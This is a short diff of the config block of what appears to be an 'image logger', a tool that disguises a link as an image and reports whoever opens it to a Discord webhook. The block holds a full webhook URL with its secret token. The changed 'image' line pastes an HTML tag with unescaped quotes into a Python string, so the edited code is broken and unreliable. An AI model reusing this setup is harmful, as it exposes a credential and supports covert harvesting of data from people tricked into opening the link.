@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334986425296228503/CCp8vx37Gqf_uER_yPf5EYpfxWfBaMefZjaI4fqo9ijjK-wiRSZWZEoWL3zhCon04kbA",
-    "image": "https://media1.tenor.com/m/Th77y_vRypgAAAAC/lebron-james-lebron-screaming.jpg" , # You can also have a custom image by using a URL argument
+    "image": "<img src="https://a.espncdn.com/combiner/i?img=/i/headshots/mlb/players/full/33192.png&amp;w=350&amp;h=254"/>" , # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
